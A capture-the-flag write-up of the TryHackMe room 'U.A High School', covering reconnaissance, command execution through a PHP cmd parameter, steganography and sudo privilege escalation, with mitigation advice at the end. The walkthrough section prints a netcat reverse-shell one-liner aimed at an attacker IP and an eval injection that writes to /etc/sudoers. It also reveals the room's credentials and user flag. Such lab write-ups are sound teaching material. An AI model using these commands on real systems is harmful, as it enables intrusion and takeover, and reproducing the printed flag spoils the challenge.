# U.A High School – TryHackMe

**Category:** Web Exploitation / Privilege Escalation  
**Difficulty:** Medium  
**Date Solved:** April 2025  

---

## 🔍 Challenge Overview
The challenge involved a vulnerable PHP web application with a hidden command execution feature.  
Through enumeration and exploitation, we obtained a reverse shell, escalated privileges using insecure script evaluation, and finally gained root access.  

---

## ⚔️ Walkthrough

### 1. Reconnaissance
- Performed an initial scan with **nmap**:

```bash
nmap -sC -sV 10.10.26.57
Findings:

22/tcp → OpenSSH 8.2p1 (Ubuntu)

80/tcp → Apache httpd 2.4.41 (Ubuntu)

2. Enumeration
Discovered /assets/index.php using feroxbuster.

Used ffuf to fuzz parameters:

bash
Copy
Edit
ffuf -u 'http://10.10.x.x/assets/index.php?FUZZ=id' \
     -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fs 0
Found parameter cmd → enabled command execution.

3. Exploitation – Command Execution
Tested with:

http
Copy
Edit
http://10.10.x.x/assets/index.php?cmd=id
Response (base64 decoded):

kotlin
Copy
Edit
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Confirmed working with commands: whoami, which nc.

4. Reverse Shell
Crafted reverse shell payload:

bash
Copy
Edit
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker-ip> 1234 >/tmp/f
Started listener:

bash
Copy
Edit
nc -lvnp 1234
Triggered payload via cmd parameter → gained shell as www-data.

Stabilized shell:

bash
Copy
Edit
python3 -c 'import pty; pty.spawn("/bin/bash")'
5. Looting & Hidden Files
Found /var/www/Hidden_Content/passphrase.txt → Base64 encoded string:

ini
Copy
Edit
QWxsbWlnaHRGb3JFdmVyISEhCg==
Decoded → AllmightForEver!!!

Downloaded hidden images (oneforall.jpg, yuei.jpg) using wget.

Corrected file header using hex editor.

Extracted hidden data with steghide:

bash
Copy
Edit
steghide extract -sf oneforall.jpg
Obtained credentials:

makefile
Copy
Edit
deku:One?For?All_!!one1/A
6. User Access
Logged in via SSH with deku credentials.

Found user flag:

ruby
Copy
Edit
THM{W3lC0m3_D3kU_1A_0n3f0rAll??}
7. Privilege Escalation
Checked sudo privileges:

bash
Copy
Edit
sudo -l
Found writable script: /opt/NewComponent/feedback.sh.

Script filtered dangerous characters but still used eval, allowing injection.

Exploited by injecting:

ruby
Copy
Edit
deku ALL =NOPASSWD:ALL >> /etc/sudoers
This gave NOPASSWD:ALL sudo access.

Gained root shell:

bash
Copy
Edit
sudo /bin/bash
Retrieved root flag:

php-template
Copy
Edit
<root.txt contents>
🎯 Impact
Remote Code Execution (RCE) via unsanitized cmd parameter.

Sensitive credentials hidden with steganography.

Privilege escalation through unsafe eval in bash script.

🛡️ Mitigation
Never use eval for handling user input.

Implement strict input validation & sanitization.

Restrict access to hidden files & remove credentials from images.

Apply principle of least privilege for sudo rules.

